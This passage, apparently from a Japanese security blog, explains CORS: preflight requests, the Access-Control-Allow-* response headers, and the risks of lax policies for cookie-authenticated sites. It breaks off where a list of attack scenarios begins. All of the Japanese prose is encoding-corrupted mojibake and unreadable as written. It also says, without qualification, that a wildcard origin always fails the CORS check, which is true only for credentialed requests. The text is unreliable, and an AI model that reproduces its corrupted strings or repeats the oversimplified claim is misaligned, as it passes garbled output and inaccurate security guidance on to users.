<p>ã“ã‚Œã¯å±é™ºãªã‚·ãƒŠãƒªã‚ªã§ã™ã€‚ã©ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã§ã‚‚Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã“ã¨ã§è¨ªå•è€…ã®ãƒ¡ãƒ¼ãƒ«ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå‡ºæ¥ãŸãªã‚‰ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã¯é‡ç”Ÿã®ã‚¸ãƒ£ãƒ³ã‚°ãƒ«ã®ã‚ˆã†ã«ãªã£ã¦ã—ã¾ã†ã§ã—ã‚‡ã†ã€‚ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’è¨­è¨ˆã—ãŸã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãŸã¡ãŒã€ãã†ãªã‚‰ãªã„ã‚ˆã†ã«ã—ãŸã®ã§ã™ã€‚</p>
<p>ä¸€æ–¹ã§ã€ã€Œèªè¨¼æƒ…å ±ã‚’å«ã‚ã‚‹ã€ã‚’æœ‰åŠ¹åŒ–ã—ãªã‹ã£ãŸå ´åˆã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã¯Cookieã¯å«ã¾ã‚Œã¾ã›ã‚“ã€‚Gmailã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ã€ãƒœãƒ–ãŒåˆ¥ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‚¿ãƒ–ã§Gmailã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ãŸã¨ã—ã¦ã‚‚ã€ãƒœãƒ–ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‚’åŒ¿åã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦æ‰±ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã™ã‚‹ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ã€ä¸€åˆ‡å€‹äººæƒ…å ±ã¯å«ã¾ã‚Œã¾ã›ã‚“ã€‚</p>
<h2>CORSãƒ«ãƒ¼ãƒ«ã®å®šç¾©</h2>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆAã‹ã‚‰ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆBã«Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹éš›ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆBã®CORSãƒ«ãƒ¼ãƒ«ã‚’å‚ç…§ã—ã€ã©ã®ã‚ˆã†ã«æŒ¯ã‚‹èˆã†ã‹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ãŒå¾“ã†CORSãƒ«ãƒ¼ãƒ«ã‚’å®šç¾©ã™ã‚‹ã®ã¯ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼Bã§ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ«ãƒ¼ãƒ«ã¯ã€ç‰¹å®šã®HTTPãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼å†…ã§å®šç¾©ã•ã‚Œã¾ã™ã€‚æœ€ã‚‚é‡è¦ãªãƒ˜ãƒƒãƒ€ãƒ¼ã¯<strong>Access-Control-Allow-Origin</strong>ã¨<strong>Access-Control-Allow-Credentials</strong>ã§ã™ã€‚ãã‚Œãã‚Œã®å½¹å‰²ã¨å–ã‚Šå¾—ã‚‹å€¤ã«ã¤ã„ã¦ã¯å¾Œã»ã©èª¬æ˜ã—ã¾ã™ã€‚</p>
<h2>ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å‡¦ç†</h2>
<p>ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒåˆ¥ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ãŸå ´åˆï¼ˆã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼‰ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯CORSãƒãƒªã‚·ãƒ¼ã‚’ç¢ºèªã—ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ‰±ã„æ–¹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚
ãƒ–ãƒ©ã‚¦ã‚¶ã¯æ¬¡ã®2ã¤ã«ã¤ã„ã¦åˆ¤æ–­ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<ol>
<li>JavaScriptã‚³ãƒ¼ãƒ‰ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã¹ãã‹ï¼Ÿ</li>
<li>ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ãŸå ´åˆã€JavaScriptã‚³ãƒ¼ãƒ‰ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã¹ãã‹ï¼Ÿ
ã“ã‚Œã‚‰2ã¤ã®ã‚¹ãƒ†ãƒƒãƒ—ã‚’æ˜ã‚Šä¸‹ã’ã¦è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</li>
</ol>
<h2>ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ã‹å¦ã‹</h2>
<p>ä¸€éƒ¨ã®Ajaxã®è¨­å®šã®ä»•æ–¹ã«ã‚ˆã£ã¦ã¯ã€ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯CORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã›ãšã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã¾ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯CORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã—ãŸä¸Šã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã‹å¦ã‹ã‚’åˆ¤æ–­ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å¾Œè€…ã®å ´åˆã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã¾ãšHTTP OPTIONSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’URLã«å¯¾ã—ã¦è¡Œã„ã€CORSãƒãƒªã‚·ãƒ¼ã‚’å–å¾—ã—ã¾ã™ã€‚ã“ã‚Œã‚’ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨è¨€ã„ã¾ã™ã€‚</p>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ãŒã©ã®ã‚ˆã†ã«ã—ã¦CORSãƒãƒªã‚·ãƒ¼ãƒã‚§ãƒƒã‚¯ã‚’è¡Œã†ã‹ã¯å¾Œã»ã©èª¬æ˜ã—ã¾ã™ã€‚ã“ã“ã§ã¯ã€<a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">ã‚¦ã‚£ã‚­ãƒšãƒ‡ã‚£ã‚¢</a>ã«ã‚ã‚‹ä»¥ä¸‹ã®ãƒ‡ã‚·ã‚¸ãƒ§ãƒ³ãƒ„ãƒªãƒ¼ï¼ˆæ±ºå®šæœ¨ï¼‰ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†å‰ã«CORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹éš›ã®æ¡ä»¶ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/CORS.png">
CORSãƒã‚§ãƒƒã‚¯ãªã—ã§ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†æ¡ä»¶ã‚’ä»¥ä¸‹ã«æŒ™ã’ã¾ã™ã€‚</p>
<ul>
<li>Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒGETãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã‚ã‚Šã€ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ãŒãªã„ã€‚</li>
<li>Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒPOSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã‚ã‚Šã€æ¨™æº–ã®Content-Typeã§ã€ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ãŒãªã„ã€‚</li>
</ul>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãªãœCORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã›ãšã«ã“ã‚Œã‚‰ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã®ã§ã—ã‚‡ã†ã‹ã€‚ãã‚Œã¯ã€ã“ã‚Œã‚‰ãŒAjaxã‚’ä½¿ã‚ãšã«ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒå®Ÿè¡Œã§ãã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã ã‹ã‚‰ã§ã™ã€‚</p>
<ul>
<li>ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã®ãªã„GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€HTMLã®imgã‚¿ã‚°ã¾ãŸã¯iframeã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦ãƒˆãƒªã‚¬ãƒ¼ã§ãã¾ã™ã€‚srcå±æ€§ã®ä¸­ã§ã‚¿ãƒ¼ã‚²ãƒƒãƒˆURLã‚’å®£è¨€ã™ã‚‹ã ã‘ã§ã™ã€‚ãƒšãƒ¼ã‚¸ã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹éš›ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒURLã«å¯¾ã—ã¦èªè¨¼æƒ…å ±ã‚’å«ã‚€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã€ãƒªã‚½ãƒ¼ã‚¹ã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚</li>
<li>HTMLã®formã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã€ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ãªã—ã§ã€æ¨™æº–ã®Content-Typeã«ã‚ˆã‚ŠPOSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã¾ã™ã€‚POSTå±æ€§ã¯ã™ã¹ã¦HTMLã®inputã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦è¿½åŠ ã§ãã€JavaScriptã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã—ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚</li>
</ul>
<p>ä»–ã®ã™ã¹ã¦ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã¾ã™ã€‚æ¬¡ã«CORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã‹åˆ¤æ–­ã—ã¾ã™ã€‚</p>
<ul>
<li>HTTPã®PUTã€DELETEã¾ãŸã¯ãã®ä»–ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆ</li>
<li>HTTPã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã€application/jsonãªã©æ¨™æº–ä»¥å¤–ã®Content-Typeã‚’ä½¿ç”¨</li>
<li>HTTPã®GETã¾ãŸã¯POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã€X-Requested-With: XMLHttpRequestãªã©ã®ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ä½¿ç”¨</li>
</ul>
<h2>ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã‹æ‹’å¦ã™ã‚‹ã‹</h2>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†å ´åˆã€JavaScriptã‚³ãƒ¼ãƒ‰ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã‹åˆ¤æ–­ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰CORSãƒãƒªã‚·ãƒ¼ã‚’å–å¾—ã—ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒCORSãƒãƒªã‚·ãƒ¼ã¨ä¸€è‡´ã™ã‚‹ã‹ç¢ºèªã—ã¾ã™ã€‚
ä¸€è‡´ã™ã‚‹å ´åˆã€JavaScriptã‚³ãƒ¼ãƒ‰ã¯ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚ä¸€è‡´ã—ãªã„å ´åˆã€JavaScriptã‚³ãƒ¼ãƒ‰ã¯ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããšã€JavaScriptã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€CORSãƒãƒªã‚·ãƒ¼ã®ãƒã‚§ãƒƒã‚¯ãƒ—ãƒ­ã‚»ã‚¹ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚</p>
<h2>CORSãƒãƒªã‚·ãƒ¼ã®ãƒã‚§ãƒƒã‚¯</h2>
<p>è¦ç´„ã™ã‚‹ã¨ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ä»¥ä¸‹ã®2ã¤ã®ã‚±ãƒ¼ã‚¹ã§CORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚</p>
<ol>
<li>æ¨™æº–ä»¥å¤–ã®HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å‰ã€‚</li>
<li>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã‹ã©ã†ã‹åˆ¤æ–­ã™ã‚‹å‰ã€‚</li>
</ol>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã¯ä»¥ä¸‹ã®è¦ç´ ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚</p>
<ul>
<li>ãƒ–ãƒ©ã‚¦ã‚¶ã¯<strong>Access-Control-Allow-Origin</strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã‚’å–å¾—ã—ã¾ã™ã€‚å€¤ã¯Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ãŸã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ã¨ä¸€è‡´ã—ãªãã¦ã¯ã„ã‘ã¾ã›ã‚“ã€‚ã‚ªãƒªã‚¸ãƒ³ã®å½¢å¼ã¯ã€Œschema://fqdn:portã€ã§ã™ã€‚
<ul>
<li><strong>Access-Control-Allow-Origin</strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ãŒãªã„å ´åˆã€ãƒã‚§ãƒƒã‚¯ã¯å¤±æ•—ã—ã¾ã™ã€‚</li>
<li>å®Ÿã¯ã€<strong>Access-Control-Allow-Origin</strong>ãƒ˜ãƒƒãƒ€ãƒ¼ã«ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰æ–‡å­—ã®ã€Œ*ã€ãŒæŒ‡å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã‚‚ãƒã‚§ãƒƒã‚¯ã¯å¤±æ•—ã—ã¾ã™ã€‚</li>
</ul>
</li>
<li>ã€Œèªè¨¼æƒ…å ±ã‚’å«ã‚ã¦ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†å ´åˆï¼š <strong>Access-Control-Allow-Credentials</strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ãŒã‚ã‚Šã€å€¤ã¯ã€Œtrueã€ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</li>
<li>ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’1ã¤ä»¥ä¸Šè¨­å®šã—ã¦Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†å ´åˆï¼šãƒ–ãƒ©ã‚¦ã‚¶ã¯<strong>Access-Control-Allow-Headers</strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã‚’å–å¾—ã—ã¾ã™ã€‚ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã«ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ä½¿ç”¨ã•ã‚ŒãŸã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ãŒã™ã¹ã¦å«ã¾ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</li>
<li>Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚¿ã‚¤ãƒ—ãŒGETã€POSTã€HEADã®ã„ãšã‚Œã§ã‚‚ãªã„å ´åˆï¼šãƒ–ãƒ©ã‚¦ã‚¶ã¯<strong>Access-Control-Allow-Methods</strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã‚’å–å¾—ã—ã¾ã™ã€‚å€¤ã«ã¯ã€Ajaxã‚¯ã‚¨ãƒªã«ã‚ˆã£ã¦å®šç¾©ã•ã‚ŒãŸHTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚¿ã‚¤ãƒ—ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</li>
</ul>
<p>ã“ã‚Œã‚‰ã®æ¡ä»¶ã®ã„ãšã‚Œã‹ãŒæº€ãŸã•ã‚Œã¦ã„ãªã„å ´åˆã€CORSãƒãƒªã‚·ãƒ¼ã®ãƒã‚§ãƒƒã‚¯å…¨ä½“ãŒå¤±æ•—ã—ã¦ä»¥ä¸‹ã®çµæœã¨ãªã‚Šã¾ã™ã€‚
ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†å‰ã«CORSãƒã‚§ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹å ´åˆã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã›ã‚“ã€‚
ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ãŸå¾Œã§CORSãƒã‚§ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹å ´åˆã€JavaScriptã‚³ãƒ¼ãƒ‰ã¯ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã€‚</p>
<p>ä»¥ä¸‹ã®å›³ã¯CORSã®ãƒ‡ã‚·ã‚¸ãƒ§ãƒ³ãƒ„ãƒªãƒ¼ã‚’ã¾ã¨ã‚ãŸã‚‚ã®ã§ã™ã€‚
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/07/recap3-1024x623.png"></p>
<div class="twitter_follow"><span>ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ä¸‡å…¨ã«ä¿ã¡ãŸã„æ–¹ã¯ã€ç­†è€…ã‚‰ã®Xã§å½¹ã«ç«‹ã¤æƒ…å ±ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‹ãƒ¥ãƒ¼ã‚¹ã®ãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆã‚’æä¾›ã—ã¦ã„ã‚‹ã®ã§ãœã²ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„</span><br/><a href="https://twitter.com/devsecurely?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @Devsecurely</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><style type="text/css" scoped>.twitter_follow span{font-size:17px;color:#000}.twitter_follow{text-align:center;--style-box-shadow-style-type: ;--style-box-shadow-distance-x:0px;--style-box-shadow-distance-y:0px;--style-box-shadow-blur:36px;--style-box-shadow-spread:4px;--style-box-shadow-color:rgb(0, 0, 0, 0.12);box-shadow:var(--style-box-shadow-style-type) var(--style-box-shadow-distance-x) var(--style-box-shadow-distance-y) var(--style-box-shadow-blur) var(--style-box-shadow-spread) var(--style-box-shadow-color);padding:8px 12px;border-radius:10px;border:1px solid #e7e7e7;background-color:#c0708c4a}.twitter_follow iframe{margin-top:10px}</style></div>
<h2>CORSãƒãƒªã‚·ãƒ¼ã®èª¤è¨­å®šã«ã‚ˆã‚‹å±é™º</h2>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒ¡ãƒ³ãƒ†ãƒŠãƒ¼ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«CORSã®ä»•çµ„ã¿ã‚’è¨­è¨ˆã—ã¾ã—ãŸã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã†ã£ã‹ã‚Šæ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã—ã¾ã†ã‹ã‚‚ã—ã‚Œãªã„ã‹ã‚‰ã§ã™ã€‚å„ªã‚ŒãŸCORSãƒãƒªã‚·ãƒ¼ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®IDã‚’ä½¿ã£ã¦ã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã§ããªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚</p>
<p>CORSãƒãƒªã‚·ãƒ¼ã¯ã€HTTPãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ç”¨ã„ã¦å®šç¾©ã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã«ã¯ä»–ã®ã‚ªãƒªã‚¸ãƒ³ã‹ã‚‰ã®æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é˜²ãã“ã¨ãŒã§ãã‚‹ã€ååˆ†å³æ ¼ãªCORSãƒãƒªã‚·ãƒ¼ã‚’å®šç¾©ã™ã‚‹ã“ã¨ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚</p>
<p>CORSã¯ã€Cookieï¼ˆã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieãªã©ï¼‰ã‚’ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼èªè¨¼ã‚’è¡Œã†ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ç‰¹ã«é–¢ä¿‚ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã€Œèªè¨¼æƒ…å ±ã‚’å«ã‚ã‚‹ã€Ajaxè¨­å®šã®å ´åˆã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒè‡ªå‹•çš„ã«Cookieã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã¨ã‚‚ã«é€ä¿¡ã™ã‚‹ã‹ã‚‰ã§ã™ã€‚ãã†ã™ã‚‹ã¨ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯æ­£å½“ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰å±Šã„ãŸã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚</p>
<p>ã§ã¯ã€ä»–ã®èªè¨¼æ–¹æ³•ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã¯ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚ä¾‹ãˆã°ã€HTTPã®ã€ŒAuthorizationã€ãƒ˜ãƒƒãƒ€ãƒ¼ã§èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ã‚’é€ä¿¡ã™ã‚‹ã¨ã—ã¾ã™ã€‚ãã®å ´åˆã€CORSãƒãƒªã‚·ãƒ¼ã¯ã‚ã¾ã‚Šé–¢ä¿‚ã‚ã‚Šã¾ã›ã‚“ã€‚æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒAjaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ã¦ã‚‚ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¿½åŠ ã—ã¾ã›ã‚“ã€‚ãã®ãŸã‚ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯æ­£è¦ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ãƒ­ãƒ¼ã‚«ãƒ«ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãŸã‚ã€Ajaxã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å«ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã€‚ã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ã€ä½•ã‚‚ã›ãšã¨ã‚‚ã“ã®æ”»æ’ƒã‚·ãƒŠãƒªã‚ªã‹ã‚‰ã¯ä¿è­·ã•ã‚Œã¾ã™ã€‚</p>
<p>Cookieã«ã‚ˆã‚‹èªè¨¼ã®å ´åˆã€CORSãƒãƒªã‚·ãƒ¼ãŒç”˜ã„ã¨æ‚ªã„ã“ã¨ãŒèµ·ã“ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸéš›ã€ä»¥ä¸‹ã®ã‚ˆã†ãªæ”»æ’ƒã‚·ãƒŠãƒªã‚ªãŒè€ƒãˆã‚‰ã‚Œã¾ã™ã€‚</p>
<ul>
